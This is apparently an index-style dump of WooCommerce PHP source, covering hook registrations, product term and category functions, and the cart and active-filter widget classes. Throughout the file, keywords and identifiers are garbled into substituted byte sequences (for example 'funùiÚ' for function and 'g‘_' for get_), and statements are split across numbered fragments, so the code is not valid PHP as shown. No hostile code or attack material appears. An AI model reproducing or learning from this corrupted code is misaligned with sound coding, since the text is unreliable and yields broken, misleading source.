13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 
add_f‹r
( 'body_class', 'wc_body_class' );

16 
add_f‹r
( 'post_class', 'wc_product_post_class', 20, 3 );

24 
add_aùiÚ
( 'wp_head', 'wc_products_rss_feed' );

25 
add_aùiÚ
( 'get_the_generator_html', 'wc_generator_tag', 10, 2 );

26 
add_aùiÚ
( 'get_the_generator_xhtml', 'wc_generator_tag', 10, 2 );

34 
add_aùiÚ
( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10 );

35 
add_aùiÚ
( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10 );

43 
add_aùiÚ
( 'woocommerce_before_shop_loop_item_title', 'woocommerce_show_product_loop_sale_flash', 10 );

44 
add_aùiÚ
( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_sale_flash', 10 );

51 
add_aùiÚ
( 'woocommerce_before_main_content', 'woocommerce_breadcrumb', 20, 0 );

58 
add_aùiÚ
( 'woocommerce_sidebar', 'woocommerce_get_sidebar', 10 );

66 
add_aùiÚ
( 'woocommerce_archive_description', 'woocommerce_taxonomy_archive_description', 10 );

67 
add_aùiÚ
( 'woocommerce_archive_description', 'woocommerce_product_archive_description', 10 );

76 
add_aùiÚ
( 'woocommerce_before_shop_loop', 'woocommerce_result_count', 20 );

77 
add_aùiÚ
( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30 );

87 
add_aùiÚ
( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10 );

88 
add_aùiÚ
( 'woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_thumbnail', 10 );

89 
add_aùiÚ
( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_price', 10 );

90 
add_aùiÚ
( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5 );

97 
add_aùiÚ
( 'woocommerce_before_subcategory_title', 'woocommerce_subcategory_thumbnail', 10 );

105 
add_aùiÚ
( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_images', 20 );

106 
add_aùiÚ
( 'woocommerce_product_thumbnails', 'woocommerce_show_product_thumbnails', 20 );

115 
add_aùiÚ
( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', 10 );

116 
add_aùiÚ
( 'woocommerce_after_single_product_summary', 'woocommerce_upsell_display', 15 );

117 
add_aùiÚ
( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );

128 
add_aùiÚ
( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', 5 );

129 
add_aùiÚ
( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10 );

130 
add_aùiÚ
( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );

131 
add_aùiÚ
( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 20 );

132 
add_aùiÚ
( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );

133 
add_aùiÚ
( 'woocommerce_single_product_summary', 'woocommerce_template_single_sharing', 50 );

144 
add_aùiÚ
( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );

145 
add_aùiÚ
( 'woocommerce_simple_add_to_cart', 'woocommerce_simple_add_to_cart', 30 );

146 
add_aùiÚ
( 'woocommerce_grouped_add_to_cart', 'woocommerce_grouped_add_to_cart', 30 );

147 
add_aùiÚ
( 'woocommerce_variable_add_to_cart', 'woocommerce_variable_add_to_cart', 30 );

148 
add_aùiÚ
( 'woocommerce_external_add_to_cart', 'woocommerce_external_add_to_cart', 30 );

155 
add_aùiÚ
( 'woocommerce_after_shop_loop', 'woocommerce_pagination', 10 );

160 
add_f‹r
( 'woocommerce_product_tabs', 'woocommerce_default_product_tabs' );

161 
add_f‹r
( 'woocommerce_product_tabs', 'woocommerce_sort_product_tabs', 99 );

170 
add_aùiÚ
( 'woocommerce_before_checkout_form', 'woocommerce_checkout_login_form', 10 );

171 
add_aùiÚ
( 'woocommerce_before_checkout_form', 'woocommerce_checkout_coupon_form', 10 );

172 
add_aùiÚ
( 'woocommerce_checkout_order_review', 'woocommerce_order_review', 10 );

179 
add_aùiÚ
( 'woocommerce_cart_collaterals', 'woocommerce_cross_sell_display' );

187 
add_aùiÚ
( 'wp_footer', 'wc_print_js', 25 );

188 
add_aùiÚ
( 'wp_footer', 'woocommerce_demo_store' );

196 
add_aùiÚ
( 'woocommerce_view_order', 'woocommerce_order_details_table', 10 );

197 
add_aùiÚ
( 'woocommerce_thankyou', 'woocommerce_order_details_table', 10 );

198 
add_aùiÚ
( 'woocommerce_order_details_after_order_table', 'woocommerce_order_again_button' );

	@includes/wc-term-functions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

26 
funùiÚ
 
wc_g‘_´oduù_‹rms
Ğ
$´oduù_id
, 
$xÚomy
, 
$¬gs
 = 
	$¬¿y
() ) {

27 iàĞ! 
	`xÚomy_exi¡s
Ğ
$xÚomy
 ) )

28  
	`¬¿y
();

30 iàĞ
	`em±y
Ğ
$¬gs
['Üd”by'] ) && 
	`xÚomy_is_´oduù_©Œibu‹
Ğ
$xÚomy
 ) ) {

31 
$¬gs
['Üd”by'] = 
	`wc_©Œibu‹_Üd”by
Ğ
$xÚomy
 );

35 iàĞ! 
	`em±y
Ğ
$¬gs
['orderby'] ) && $args['orderby'] == 'parent' ) {

36 
$f›lds
 = 
	`is£t
Ğ
$¬gs
['fields'] ) ? $args['fields'] : 'all';

39 
	`un£t
Ğ
$¬gs
['orderby'] );

40 
	`un£t
Ğ
$¬gs
['fields'] );

42 
$‹rms
 = 
	`wp_g‘_po¡_‹rms
Ğ
$´oduù_id
, 
$xÚomy
, 
$¬gs
 );

44 
	`usÜt
Ğ
$‹rms
, '_wc_get_product_terms_parent_usort_callback' );

46  
$f›lds
 ) {

48 
$‹rms
 = 
	`wp_li¡_¶uck
( $terms, 'name' );

51 
$‹rms
 = 
	`wp_li¡_¶uck
( $terms, 'term_id' );

54 
$‹rms
 = 
	`wp_li¡_¶uck
( $terms, 'slug' );

58 
$‹rms
 = 
	`wp_g‘_po¡_‹rms
Ğ
$´oduù_id
, 
$xÚomy
, 
$¬gs
 );

61  
$‹rms
;

62 
	}
}

70 
funùiÚ
 
	$_wc_g‘_´oduù_‹rms_·»Á_usÜt_ÿÎback
Ğ
$a
, 
$b
 ) {

71 ifĞ
$a
->
·»Á
 ==ğ
$b
->parent )

73  ( 
$a
->
·»Á
 < 
$b
->parent ) ? 1 : -1;

74 
	}
}

87 
funùiÚ
 
wc_´oduù_drİdown_ÿ‹gÜ›s
Ğ
$¬gs
 = 
¬¿y
(), 
$d•»ÿ‹d_h›¿rchiÿl
 = 1, 
$d•»ÿ‹d_show_unÿ‹gÜized
 = 1, 
$d•»ÿ‹d_Üd”by
 = '' ) {

88 
glob®
 
$wp_qu”y
, 
$woocomm”û
;

90 iàĞ! 
is_¬¿y
Ğ
$¬gs
 ) ) {

91 
_d•»ÿ‹d_¬gum’t
( 'wc_product_dropdown_categories()', '2.1', 'show_counts, hierarchical, show_uncategorized‡nd orderby‡rguments‡re invalid -…ass‡ single‡rray of values instead.' );

93 
	g$¬gs
['show_couÁs'] = 
$¬gs
;

94 
	g$¬gs
['h›¿rchiÿl'] = 
$d•»ÿ‹d_h›¿rchiÿl
;

95 
	g$¬gs
['show_unÿ‹gÜized'] = 
$d•»ÿ‹d_show_unÿ‹gÜized
;

96 
	g$¬gs
['Üd”by'] = 
$d•»ÿ‹d_Üd”by
;

99 
	g$deçuÉs
 = 
¬¿y
(

106 '£Ëùed' => 
is£t
Ğ
$wp_qu”y
->
qu”y
['product_cat'] ) ? $wp_query->query['product_cat'] : '',

107 'm’u_Üd”' => 
çl£


110 
	g$¬gs
 = 
wp_·r£_¬gs
Ğ
$¬gs
, 
$deçuÉs
 );

112 iàĞ
	g$¬gs
['orderby'] == 'order' ) {

113 
$¬gs
['menu_order'] = 'asc';

114 
	g$¬gs
['orderby'] = 'name';

117 
	g$‹rms
 = 
g‘_‹rms
Ğ'´oduù_ÿt', 
$¬gs
 );

119 iàĞ! 
	g$‹rms
 )

122 
	g$ouut
 = "<select‚ame='product_cat' id='dropdown_product_cat'>";

123 
	g$ouut
 .ğ'<İtiÚ v®ue="" ' . 
£Ëùed
Ğ
is£t
Ğ
$_GET
['´oduù_ÿt'] ) ? $_GET['´oduù_ÿt'] : '', '', 
çl£
 ) . '>' . 
__
( 'Select‡ category', 'woocommerce' ) . '</option>';

124 
	g$ouut
 .ğ
wc_w®k_ÿ‹gÜy_drİdown_Œ“
Ğ
$‹rms
, 0, 
$¬gs
 );

126 iàĞ
	g$¬gs
['show_uncategorized'] )

127 
	g$ouut
 .ğ'<İtiÚ v®ue="0" ' . 
£Ëùed
Ğ
is£t
Ğ
$_GET
['´oduù_ÿt'] ) ? $_GET['´oduù_ÿt'] : '', '0', 
çl£
 ) . '>' . 
__
( 'Uncategorized', 'woocommerce' ) . '</option>';

129 
	g$ouut
 .="</select>";

131 
echo
 
	g$ouut
;

139 
funùiÚ
 
	$wc_w®k_ÿ‹gÜy_drİdown_Œ“
() {

140 
glob®
 
$woocomm”û
;

142 iàĞ! 
	`şass_exi¡s
( 'WC_Product_Cat_Dropdown_Walker' ) )

143 
	`šşude_Úû
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/walkers/class-product-cat-dropdown-walker.php' );

145 
$¬gs
 = 
	`func_g‘_¬gs
();

148 iàĞ
	`em±y
Ğ
$¬gs
[2]['w®k”']è|| !
	`is_a
($args[2]['walker'], 'Walker' ) )

149 
$w®k”
 = 
Ãw
 
WC_Produù_C©_Drİdown_W®k”
;

151 
$w®k”
 = 
$¬gs
[2]['walker'];

153  
	`ÿÎ_u£r_func_¬¿y
(
	`¬¿y
Ğ&
$w®k”
, 'w®k' ), 
$¬gs
 );

154 
	}
}

161 
funùiÚ
 
	$wc_xÚomy_m‘ad©a_wpdbfix
() {

162 
glob®
 
$wpdb
;

163 
$‹rmm‘a_Çme
 = 'woocommerce_termmeta';

164 
$™emm‘a_Çme
 = 'woocommerce_order_itemmeta';

166 
$wpdb
->
woocomm”û_‹rmm‘a
 = $wpdb->
´efix
 . 
$‹rmm‘a_Çme
;

167 
$wpdb
->
Üd”_™emm‘a
 = $wpdb->
´efix
 . 
$™emm‘a_Çme
;

169 
$wpdb
->
bËs
[] = 'woocommerce_termmeta';

170 
$wpdb
->
bËs
[] = 'woocommerce_order_itemmeta';

171 
	}
}

172 
add_aùiÚ
( 'init', 'wc_taxonomy_metadata_wpdbfix', 0 );

173 
add_aùiÚ
( 'switch_blog', 'wc_taxonomy_metadata_wpdbfix', 0 );

184 
funùiÚ
 
upd©e_woocomm”û_‹rm_m‘a
Ğ
$‹rm_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$´ev_v®ue
 = '' ) {

185  
upd©e_m‘ad©a
Ğ'woocomm”û_‹rm', 
$‹rm_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$´ev_v®ue
 );

197 
funùiÚ
 
	$add_woocomm”û_‹rm_m‘a
Ğ
$‹rm_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$unique
 = 
çl£
 ){

198  
	`add_m‘ad©a
Ğ'woocomm”û_‹rm', 
$‹rm_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$unique
 );

199 
	}
}

210 
funùiÚ
 
d–‘e_woocomm”û_‹rm_m‘a
Ğ
$‹rm_id
, 
$m‘a_key
, 
$m‘a_v®ue
 = '', 
$d–‘e_®l
 = 
çl£
 ) {

211  
d–‘e_m‘ad©a
Ğ'woocomm”û_‹rm', 
$‹rm_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$d–‘e_®l
 );

222 
funùiÚ
 
	$g‘_woocomm”û_‹rm_m‘a
Ğ
$‹rm_id
, 
$key
, 
$sšgË
 = 
Œue
 ) {

223  
	`g‘_m‘ad©a
Ğ'woocomm”û_‹rm', 
$‹rm_id
, 
$key
, 
$sšgË
 );

224 
	}
}

236 
funùiÚ
 
	$wc_»Üd”_‹rms
Ğ
$the_‹rm
, 
$Ãxt_id
, 
$xÚomy
, 
$šdex
 = 0, 
$‹rms
 = 
nuÎ
 ) {

238 ifĞ! 
$‹rms
 ) $‹rm ğ
	`g‘_‹rms
(
$xÚomy
, 'menu_order=ASC&hide_empty=0&parent=0' );

239 ifĞ
	`em±y
Ğ
$‹rms
 ) )  
$šdex
;

241 
$id
 = 
$the_‹rm
->
‹rm_id
;

243 
$‹rm_š_Ëv–
 = 
çl£
;

245 
	`fÜ—ch
 (
$‹rms
 
as
 
$‹rm
) {

247 ifĞ
$‹rm
->
‹rm_id
 =ğ
$id
 ) {

248 
$‹rm_š_Ëv–
 = 
Œue
;

252 if(
nuÎ
 !=ğ
$Ãxt_id
 && 
$‹rm
->
‹rm_id
 == $next_id) {

253 
$šdex
++;

254 
$šdex
 = 
	`wc_£t_‹rm_Üd”
(
$id
, $šdex, 
$xÚomy
, 
Œue
);

258 
$šdex
++;

259 
$šdex
 = 
	`wc_£t_‹rm_Üd”
(
$‹rm
->
‹rm_id
, $šdex, 
$xÚomy
);

262 
$chd»n
 = 
	`g‘_‹rms
(
$xÚomy
, "parent={$term->term_id}&menu_order=ASC&hide_empty=0");

263 ifĞ!
	`em±y
(
$chd»n
) ) {

264 
$šdex
 = 
	`wc_»Üd”_‹rms
Ğ
$the_‹rm
, 
$Ãxt_id
, 
$xÚomy
, $šdex, 
$chd»n
 );

269 ifĞ
$‹rm_š_Ëv–
 && 
nuÎ
 ==ğ
$Ãxt_id
 )

270 
$šdex
 = 
	`wc_£t_‹rm_Üd”
(
$id
, $šdex+1, 
$xÚomy
, 
Œue
);

272  
$šdex
;

273 
	}
}

284 
funùiÚ
 
	$wc_£t_‹rm_Üd”
Ğ
$‹rm_id
, 
$šdex
, 
$xÚomy
, 
$»cursive
 = 
çl£
 ) {

286 
$‹rm_id
 = () $term_id;

287 
$šdex
 = () $index;

290 iàĞ
	`xÚomy_is_´oduù_©Œibu‹
Ğ
$xÚomy
 ) )

291 
$m‘a_Çme
 = 'Üd”_' . 
	`esc_©Œ
Ğ
$xÚomy
 );

293 
$m‘a_Çme
 = 'order';

295 
	`upd©e_woocomm”û_‹rm_m‘a
Ğ
$‹rm_id
, 
$m‘a_Çme
, 
$šdex
 );

297 ifĞ! 
$»cursive
 )  
$šdex
;

299 
$chd»n
 = 
	`g‘_‹rms
(
$xÚomy
, "parent=$term_id&menu_order=ASC&hide_empty=0");

301 
	`fÜ—ch
 ( 
$chd»n
 
as
 
$‹rm
 ) {

302 
$šdex
 ++;

303 
$šdex
 = 
	`wc_£t_‹rm_Üd”
(
$‹rm
->
‹rm_id
, $šdex, 
$xÚomy
, 
Œue
);

306 
	`ş—n_‹rm_ÿche
Ğ
$‹rm_id
, 
$xÚomy
 );

308  
$šdex
;

309 
	}
}

324 
funùiÚ
 
	$wc_‹rms_şau£s
Ğ
$şau£s
, 
$xÚom›s
, 
$¬gs
 ) {

325 
glob®
 
$wpdb
, 
$woocomm”û
;

328 iàĞ
	`is£t
Ğ
$¬gs
['m’u_Üd”'] ) && $¬gs['m’u_Üd”'] =ğ
çl£
 ) {

329  
$şau£s
;

333 iàĞ
	`is£t
Ğ
$¬gs
['orderby'] ) && $args['orderby'] != 'name' ) {

334  
$şau£s
;

338 iàĞ
	`is_admš
(è&& 
	`is£t
Ğ
$_GET
['orderby'] ) ) {

339  
$şau£s
;

343 
$found
 = 
çl£
;

344 
	`fÜ—ch
 ( (
¬¿y
è
$xÚom›s
 
as
 
$xÚomy
 ) {

345 iàĞ
	`xÚomy_is_´oduù_©Œibu‹
Ğ
$xÚomy
 ) || 
	`š_¬¿y
Ğ$xÚomy, 
	`­¶y_f‹rs
Ğ'woocomm”û_sÜbË_xÚom›s', 
	`¬¿y
( 'product_cat' ) ) ) ) {

346 
$found
 = 
Œue
;

350 iàĞ! 
$found
 ) {

351  
$şau£s
;

355 iàĞ! 
	`em±y
Ğ
$xÚom›s
[0] ) && 
	`xÚomy_is_´oduù_©Œibu‹
( $taxonomies[0] ) ) {

356 
$m‘a_Çme
 = 'Üd”_' . 
	`esc_©Œ
Ğ
$xÚom›s
[0] );

358 
$m‘a_Çme
 = 'order';

362 iàĞ
	`¡½os
Ğ'COUNT(*)', 
$şau£s
['f›lds'] ) ==ğ
çl£
 ) {

363 
$şau£s
['fields'] .= ',m.* ';

367 
$şau£s
['još'] .ğ" LEFT JOIN {$wpdb->woocomm”û_‹rmm‘a} ASm ON (t.‹rm_id =m.woocomm”û_‹rm_id ANDm.m‘a_key = '". 
$m‘a_Çme
 ."') ";

370 iàĞ! 
	`is£t
Ğ
$¬gs
['m’u_Üd”'] ) || ! 
	`š_¬¿y
Ğ
	`¡¹ouµ”
($¬gs['m’u_Üd”']), 
	`¬¿y
('ASC', 'DESC')) ) {

371 
$¬gs
['menu_order'] = 'ASC';

374 
$Üd”
 = "ORDER BYm.m‘a_v®ue+0 " . 
$¬gs
['menu_order'];

376 iàĞ
$şau£s
['orderby'] ):

377 
$şau£s
['Üd”by'] = 
	`¡r_»¶aû
('ORDER BY', 
$Üd”
 . ',', $clauses['orderby'] );

379 
$şau£s
['Üd”by'] = 
$Üd”
;

380 
’dif
;

382  
$şau£s
;

383 
	}
}

384 
add_f‹r
( 'terms_clauses', 'wc_terms_clauses', 10, 3 );

394 
funùiÚ
 
	$_wc_‹rm_»couÁ
Ğ
$‹rms
, 
$xÚomy
, 
$ÿÎback
 = 
Œue
, 
$‹rms_¬e_‹rm_xÚomy_ids
 =rue ) {

395 
glob®
 
$wpdb
;

398 iàĞ
$ÿÎback
 ) {

399 
	`_upd©e_po¡_‹rm_couÁ
Ğ
$‹rms
, 
$xÚomy
 );

403 iàĞ
	`g‘_İtiÚ
( 'woocommerce_hide_out_of_stock_items' ) == 'yes' ) {

404 
$¡ock_još
 = "LEFT JOIN {$wpdb->postmeta} AS meta_stock ON…osts.ID = meta_stock.post_id";

405 
$¡ock_qu”y
 = "

406 
AND
 
m‘a_¡ock
.
m‘a_key
 = '_stock_status'

407 
AND
 
m‘a_¡ock
.
m‘a_v®ue
 = 'instock'

410 
$¡ock_qu”y
 = 
$¡ock_još
 = '';

414 
$couÁ_qu”y
 = "

415 
SELECT
 
	`COUNT
Ğ
DISTINCT
 
po¡s
.
ID
 ) 
FROM
 {
$wpdb
->po¡s} 
as
…osts

416 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
m‘a_visib™y
 
ON
 
po¡s
.
ID
 = m‘a_visib™y.
po¡_id


417 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_»ÏtiÚshs
} 
AS
 
»l
 
ON
 
po¡s
.
ID
ô–.
objeù_ID


418 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_xÚomy
} 
AS
 
x
 
	`USING
Ğ
‹rm_xÚomy_id
 )

419 
LEFT
 
JOIN
 {
$wpdb
->
‹rms
} 
AS
 
‹rm
 
	`USING
Ğ
‹rm_id
 )

420 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
…o¡m‘¨
ON
 
po¡s
.
ID
 =…o¡m‘a.
po¡_id


421 
$¡ock_još


422 
WHERE
 
po¡_¡©us
 = 'publish'

423 
AND
 
po¡_ty³
 = 'product'

424 
AND
 
m‘a_visib™y
.
m‘a_key
 = '_visibility'

425 
AND
 
m‘a_visib™y
.
m‘a_v®ue
 
	`IN
 ( 'visible', 'catalog' )

426 
$¡ock_qu”y


430 iàĞ! 
$‹rms_¬e_‹rm_xÚomy_ids
 ) {

432 
$‹rms
 = 
	`¬¿y_f‹r
Ğ(
¬¿y
è
	`¬¿y_keys
( $terms ) );

435 
$‹rm_xÚomy_ids
 = 
$‹rms
;

436 
$‹rms
 = 
	`¬¿y
();

437 
	`fÜ—ch
 ( 
$‹rm_xÚomy_ids
 
as
 
$‹rm_xÚomy_id
 ) {

438 
$‹rm
 = 
	`g‘_‹rm_by
Ğ'‹rm_xÚomy_id', 
$‹rm_xÚomy_id
, 
$xÚomy
->
Çme
 );

439 
$‹rms
[] = 
$‹rm
->
‹rm_id
;

444 iàĞ! 
$‹rms
 ) {

449 iàĞ
	`is_xÚomy_h›¿rchiÿl
Ğ
$xÚomy
->
Çme
 ) ) {

450 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm_id
 ) {

451 
$‹rms
 = 
	`¬¿y_m”ge
Ğ$‹rms, 
	`g‘_ªû¡Üs
Ğ
$‹rm_id
, 
$xÚomy
->
Çme
 ) );

456 
$‹rms
 = 
	`¬¿y_unique
( $terms );

459 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm_id
 ) {

460 
$‹rms_to_couÁ
 = 
	`¬¿y
Ğ
	`absšt
Ğ
$‹rm_id
 ) );

462 iàĞ
	`is_xÚomy_h›¿rchiÿl
Ğ
$xÚomy
->
Çme
 ) ) {

464 iàĞĞ
$chd»n
 = 
	`g‘_‹rm_chd»n
Ğ
$‹rm_id
, 
$xÚomy
->
Çme
 ) ) && ! 
	`is_wp_”rÜ
( $children ) ) {

465 
$‹rms_to_couÁ
 = 
	`¬¿y_unique
Ğ
	`¬¿y_m­
Ğ'absšt', 
	`¬¿y_m”ge
Ğ$‹rms_to_couÁ, 
$chd»n
 ) ) );

470 
$‹rm_qu”y
 = 'AND”m_id IN ( ' . 
	`im¶ode
Ğ',', 
$‹rms_to_couÁ
 ) . ' )';

473 
$couÁ
 = 
$wpdb
->
	`g‘_v¬
Ğ
$couÁ_qu”y
 . 
$‹rm_qu”y
 );

476 
	`upd©e_woocomm”û_‹rm_m‘a
Ğ
$‹rm_id
, '´oduù_couÁ_' . 
$xÚomy
->
Çme
, 
	`absšt
Ğ
$couÁ
 ) );

478 
	}
}

485 
funùiÚ
 
	$wc_»couÁ_aá”_¡ock_chªge
Ğ
$´oduù_id
 ) {

486 iàĞ
	`g‘_İtiÚ
( 'woocommerce_hide_out_of_stock_items' ) != 'yes' )

489 
$´oduù_‹rms
 = 
	`g‘_the_‹rms
Ğ
$´oduù_id
, 'product_cat' );

491 iàĞ
$´oduù_‹rms
 ) {

492 
	`fÜ—ch
 ( 
$´oduù_‹rms
 
as
 
$‹rm
 )

493 
$´oduù_ÿts
[ 
$‹rm
->
‹rm_id
 ] = $‹rm->
·»Á
;

495 
	`_wc_‹rm_»couÁ
Ğ
$´oduù_ÿts
, 
	`g‘_xÚomy
Ğ'´oduù_ÿt' ), 
çl£
, false );

498 
$´oduù_‹rms
 = 
	`g‘_the_‹rms
Ğ
$´oduù_id
, 'product_tag' );

500 iàĞ
$´oduù_‹rms
 ) {

501 
	`fÜ—ch
 ( 
$´oduù_‹rms
 
as
 
$‹rm
 )

502 
$´oduù_gs
[ 
$‹rm
->
‹rm_id
 ] = $‹rm->
·»Á
;

504 
	`_wc_‹rm_»couÁ
Ğ
$´oduù_gs
, 
	`g‘_xÚomy
Ğ'´oduù_g' ), 
çl£
, false );

507 
	`d–‘e_Œªs›Á
( 'wc_term_counts' );

508 
	}
}

509 
add_aùiÚ
( 'woocommerce_product_set_stock_status', 'wc_recount_after_stock_change' );

521 
funùiÚ
 
	$wc_chªge_‹rm_couÁs
Ğ
$‹rms
, 
$xÚom›s
, 
$¬gs
 ) {

522 iàĞ
	`is_admš
(è|| 
	`is_ajax
() ) {

523  
$‹rms
;

526 iàĞ! 
	`is£t
Ğ
$xÚom›s
[0] ) || ! 
	`š_¬¿y
Ğ$xÚom›s[0], 
	`­¶y_f‹rs
Ğ'woocomm”û_chªge_‹rm_couÁs', 
	`¬¿y
( 'product_cat', 'product_tag' ) ) ) ) {

527  
$‹rms
;

530 
$‹rm_couÁs
 = 
$o_‹rm_couÁs
 = 
	`g‘_Œªs›Á
( 'wc_term_counts' );

532 
	`fÜ—ch
 ( 
$‹rms
 
as
 &
$‹rm
 ) {

533 iàĞ
	`is_objeù
Ğ
$‹rm
 ) ) {

534 
$‹rm_couÁs
[ 
$‹rm
->
‹rm_id
 ] = 
	`is£t
Ğ$‹rm_couÁs[ $‹rm->‹rm_id ] ) ? $‹rm_couÁs[ $‹rm->‹rm_id ] : 
	`g‘_woocomm”û_‹rm_m‘a
Ğ$‹rm->‹rm_id, '´oduù_couÁ_' . 
$xÚom›s
[0] , 
Œue
 );

536 iàĞ
$‹rm_couÁs
[ 
$‹rm
->
‹rm_id
 ] !== '' ) {

537 
$‹rm
->
couÁ
 = 
	`absšt
Ğ
$‹rm_couÁs
[ $‹rm->
‹rm_id
 ] );

543 iàĞ
$‹rm_couÁs
 !ğ
$o_‹rm_couÁs
 ) {

544 
	`£t_Œªs›Á
Ğ'wc_‹rm_couÁs', 
$‹rm_couÁs
, 
YEAR_IN_SECONDS
 );

547  
$‹rms
;

548 
	}
}

549 
add_f‹r
( 'get_terms', 'wc_change_term_counts', 10, 3 );

	@includes/widgets/class-wc-widget-cart.php

1 <?
php


14 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Widg‘_C¬t
 
ex‹nds
 
	mWC_Widg‘
 {

21 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

22 
$this
->
widg‘_cssşass
 = 'woocommerce widget_shopping_cart';

23 
$this
->
widg‘_desütiÚ
 = 
	`__
( "Displayhe user's Cart inhe sidebar.", 'woocommerce' );

24 
$this
->
widg‘_id
 = 'woocommerce_widget_cart';

25 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Cart', 'woocommerce' );

26 
$this
->
£‰šgs
 = 
	`¬¿y
(

27 't™Ë' => 
	`¬¿y
(

29 '¡d' => 
	`__
( 'Cart', 'woocommerce' ),

30 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

32 'hide_if_em±y' => 
	`¬¿y
(

35 'Ïb–' => 
	`__
( 'Hide if cart isƒmpty', 'woocommerce' )

38 
·»Á
::
	`__cÚ¡ruù
();

50 
public
 
funùiÚ
 
	$widg‘
Ğ
$¬gs
, 
$š¡ªû
 ) {

52 
	`exŒaù
Ğ
$¬gs
 );

54 iàĞ
	`is_ÿ¹
(è|| 
	`is_checkout
() ) ;

56 
$t™Ë
 = 
	`­¶y_f‹rs
('widg‘_t™Ë', 
	`em±y
Ğ
$š¡ªû
['t™Ë'] ) ? 
	`__
Ğ'C¬t', 'woocomm”û' ) : $š¡ªû['t™Ë'], $š¡ªû, 
$this
->
id_ba£
 );

57 
$hide_if_em±y
 = 
	`em±y
Ğ
$š¡ªû
['hide_if_empty'] ) ? 0 : 1;

59 
echo
 
$befÜe_widg‘
;

61 iàĞ
$t™Ë
 )

62 
echo
 
$befÜe_t™Ë
 . 
$t™Ë
 . 
$aá”_t™Ë
;

64 iàĞ
$hide_if_em±y
 )

65 
echo
 '<div class="hide_cart_widget_if_empty">';

68 
echo
 '<div class="widget_shopping_cart_content"></div>';

70 iàĞ
$hide_if_em±y
 )

71 
echo
 '</div>';

73 
echo
 
$aá”_widg‘
;

74 
	}
}

77 
»gi¡”_widg‘
( 'WC_Widget_Cart' );

	@includes/widgets/class-wc-widget-layered-nav-filters.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Widg‘_Lay”ed_Nav_F‹rs
 
ex‹nds
 
	mWC_Widg‘
 {

19 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

20 
$this
->
widg‘_cssşass
 = 'woocommerce widget_layered_nav_filters';

21 
$this
->
widg‘_desütiÚ
 = 
	`__
( 'Shows‡ctive†ayered‚av filters so users can see‡nd deactivatehem.', 'woocommerce' );

22 
$this
->
widg‘_id
 = 'woocommerce_layered_nav_filters';

23 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Layered Nav Filters', 'woocommerce' );

24 
$this
->
£‰šgs
 = 
	`¬¿y
(

25 't™Ë' => 
	`¬¿y
(

27 '¡d' => 
	`__
( 'Active Filters', 'woocommerce' ),

28 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

31 
·»Á
::
	`__cÚ¡ruù
();

43 
public
 
funùiÚ
 
	$widg‘
Ğ
$¬gs
, 
$š¡ªû
 ) {

44 
glob®
 
$_cho£n_©Œibu‹s
, 
$woocomm”û
;

46 
	`exŒaù
Ğ
$¬gs
 );

48 iàĞ! 
	`is_po¡_ty³_¬chive
Ğ'´oduù' ) && ! 
	`is_x
Ğ
	`g‘_objeù_xÚom›s
( 'product' ) ) )

51 
$cu¼’t_‹rm
 = 
	`is_x
(è? 
	`g‘_qu”›d_objeù
()->
‹rm_id
 : '';

52 
$cu¼’t_x
 = 
	`is_x
(è? 
	`g‘_qu”›d_objeù
()->
xÚomy
 : '';

53 
$t™Ë
 = 
	`­¶y_f‹rs
Ğ'widg‘_t™Ë', 
$š¡ªû
['t™Ë'], $š¡ªû, 
$this
->
id_ba£
 );

56 
$mš_´iû
 = 
	`is£t
Ğ
$_GET
['mš_´iû'] ) ? 
	`esc_©Œ
( $_GET['min_price'] ) : 0;

57 
$max_´iû
 = 
	`is£t
Ğ
$_GET
['max_´iû'] ) ? 
	`esc_©Œ
( $_GET['max_price'] ) : 0;

59 iàĞ
	`couÁ
Ğ
$_cho£n_©Œibu‹s
 ) > 0 || 
$mš_´iû
 > 0 || 
$max_´iû
 > 0 ) {

61 
echo
 
$befÜe_widg‘
;

62 iàĞ
$t™Ë
 ) {

63 
echo
 
$befÜe_t™Ë
 . 
$t™Ë
 . 
$aá”_t™Ë
;

66 
echo
 "<ul>";

69 ià(!
	`is_nuÎ
(
$_cho£n_©Œibu‹s
)){

70 
	`fÜ—ch
 ( 
$_cho£n_©Œibu‹s
 
as
 
$xÚomy
